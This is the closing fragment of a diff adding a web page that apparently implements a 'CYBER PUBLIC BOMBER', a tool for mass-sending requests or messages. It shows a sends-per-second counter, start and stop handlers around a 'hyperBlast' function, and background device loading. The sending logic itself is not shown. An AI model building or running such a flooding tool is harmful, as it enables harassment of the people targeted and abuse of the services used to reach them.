+    const now = Date.now(), dt = (now - lastTime) / 1000;
+    if(dt > 0){
+      const speed = Math.round((success - lastSent) / dt);
+      qSpeedStat.textContent = speed.toLocaleString('en-IN') + '/s';
+    }
+    lastSent = success; lastTime = now;
+  }, 500);
+
+  pump();
+}
+
+startBtn.addEventListener('click', hyperBlast);
+stopBtn.addEventListener('click', () => {
+  state.stopFlag = true;
+  toast('⏹ Stopping…');
+  log('⏹ Stop requested', 'warn');
+});
+
+log('💣 CYBER PUBLIC BOMBER initialized', 'info');
+flushLogs();
+
+state.loadPromise = loadAllDevicesInBackground();
+</script>
+</body>
+</html>
